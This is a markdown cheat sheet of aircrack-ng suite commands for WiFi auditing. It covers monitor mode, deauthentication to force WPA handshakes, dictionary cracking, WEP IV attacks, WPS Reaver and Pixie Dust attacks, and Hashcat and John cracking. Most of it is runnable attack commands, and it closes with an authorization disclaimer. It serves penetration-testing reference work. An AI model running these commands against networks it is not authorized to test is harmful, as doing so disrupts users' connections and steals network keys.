# Advanced Aircrack-ng Commands 📡

## 🎯 Purpose
Command reference for the aircrack-ng suite covering the full traditional WiFi auditing workflow: monitor mode → network scanning → deauth-forced handshake capture → WPA/WEP/WPS cracking. This is the active-deauth approach, as opposed to the passive PMKID method covered in [hcxtoolshashcat.md](hcxtoolshashcat.md).

## ⚙️ Function
Organized by workflow phase and attack type: basic WPA/WPA2 handshake workflow, advanced deauth options, WEP cracking, WPS attacks, airodump/aireplay advanced flags, and file format conversion. Unlike hcxtoolshashcat.md (which uses hcxtools for passive capture and Hashcat mode 22000), this file uses aircrack-ng's own cracking engine and covers legacy formats including WEP and WPS PIN attacks that hcxtools does not address.

## 🏆 Goal
Capture a WPA handshake or recover a WEP/WPS key using the aircrack-ng toolkit, then crack the resulting hash via dictionary attack.

## 📋 When to Use
- When a client is actively associated and you can force a handshake via deauth
- When targeting **WEP** networks (aircrack-ng is the standard tool for IV-based WEP cracking)
- When running **WPS PIN attacks** with Reaver/Pixiedust
- When hcxtools is unavailable or the target network has no PMKID
- When you want to use aircrack-ng's built-in CPU-based cracker rather than GPU (Hashcat)

---

### Basic Workflow

**1. Enable Monitor Mode**
```bash
sudo airmon-ng check kill          # Kill interfering processes (NetworkManager, wpa_supplicant)
sudo airmon-ng start wlan1         # Enable monitor mode (creates wlan1mon)
```

**2. Scan for Networks**
```bash
sudo airodump-ng wlan1mon                                              # Scan all channels
sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX wlan1mon             # Target specific AP
```

**3. Capture Handshakes**
```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan1mon
```

**4. Deauth Attack (Force Handshake)**
```bash
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan1mon           # Deauth all clients
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT:MAC wlan1mon  # Target specific client
```

---

### Advanced Techniques

**WPA/WPA2 Cracking (aircrack-ng built-in)**
```bash
# Dictionary attack
aircrack-ng -w /path/to/wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# With ESSID filter
aircrack-ng -w wordlist.txt -e "NetworkName" capture-01.cap

# Using multiple CPU cores
aircrack-ng -w wordlist.txt capture-01.cap -p 4
```

> **GPU cracking:** For faster cracking, convert the .cap to Hashcat's unified format and use mode 22000.
> See [hcxtoolshashcat.md](hcxtoolshashcat.md) for the conversion workflow.

**WEP Cracking**
```bash
# Fake authentication
sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan1mon

# ARP replay attack (generates IVs)
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan1mon

# Crack WEP key (run once you have 20,000+ IVs)
aircrack-ng capture-01.cap
```

**WPS Attacks**
```bash
# Scan for WPS-enabled networks
sudo wash -i wlan1mon

# Reaver online brute force (WPS PIN)
sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -vv

# Pixie Dust attack (offline - exploits weak random number generation)
sudo reaver -i wlan1mon -b AA:BB:CC:DD:EE:FF -vv -K
```

**PMKID Attack (Clientless - No Deauth Needed)**
```bash
# Capture PMKID passively
sudo hcxdumptool -i wlan1mon -o pmkid.pcapng --enable_status=1

# Convert to Hashcat unified format (mode 22000)
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Crack with Hashcat
hashcat -m 22000 pmkid.hc22000 wordlist.txt
```
> For the full passive PMKID workflow, see [hcxtoolshashcat.md](hcxtoolshashcat.md).

---

**Airodump-ng Advanced Options**
```bash
# Save only handshakes in pcap format
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture --output-format pcap wlan1mon

# Show hardware manufacturers
sudo airodump-ng --manufacturer wlan1mon

# Focus on 5GHz band
sudo airodump-ng --band a wlan1mon

# Show only WPA networks
sudo airodump-ng --encrypt wpa wlan1mon
```

**Aireplay-ng Advanced Options**
```bash
# Continuous deauth (use with caution - disrupts all clients)
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan1mon

# Interactive packet replay
sudo aireplay-ng --interactive wlan1mon

# Fragmentation attack (generates keystream for WEP)
sudo aireplay-ng --fragment -b AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan1mon

# Chopchop attack (decrypts WEP packet without key)
sudo aireplay-ng --chopchop -b AA:BB:CC:DD:EE:FF -h YOUR:MAC wlan1mon
```

---

**Converting Capture Files**
```bash
# Convert .cap to pcapng (required for hcxpcapngtool input)
editcap -F pcapng capture-01.cap capture-01.pcapng

# Convert pcapng to Hashcat unified format (mode 22000)
hcxpcapngtool -o output.hc22000 capture-01.pcapng

# Merge multiple capture files
mergecap -w merged.cap capture-*.cap

# Clean/filter capture file
wpaclean cleaned.cap capture-01.cap
```

**Cracking with Hashcat (mode 22000)**
```bash
# WPA/WPA2/WPA3 - unified mode (replaces deprecated 2500 and 16800)
hashcat -m 22000 output.hc22000 wordlist.txt

# With rules
hashcat -m 22000 output.hc22000 wordlist.txt -r rules/best64.rule
```

**Cracking with John the Ripper**
```bash
hccap2john capture.hccap > hash.txt
john --wordlist=wordlist.txt hash.txt
```

---

## Additional Resources 📚

- Aircrack-ng documentation: https://www.aircrack-ng.org/documentation.html
- Hashcat wiki: https://hashcat.net/wiki/

---

## Security and Ethical Considerations ⚠️

**IMPORTANT**: These tools are for **authorized security testing only**. Unauthorized use is illegal.

- Get **written permission** before testing any network. Only test networks you own or have explicit authorization to test.
- All cracking attempts must be done in an **isolated lab environment** against hashes you are authorized to possess.
- Strictly comply with all local laws and regulations.

**Legal Use Cases:**
- Penetration testing with client authorization
- Testing your own home or lab network security
- Security research in isolated lab environments

---

## Related Files
- [hcxtoolshashcat.md](hcxtoolshashcat.md) - Modern passive PMKID/handshake capture with hcxtools and Hashcat mode 22000
- [pwnagotchi_cheatsheet.md](pwnagotchi_cheatsheet.md) - Automated passive capture using hcxtools/bettercap
- [WifiMarauder_CheatSheet.md](WifiMarauder_CheatSheet.md) - ESP32 Marauder for mobile WiFi auditing
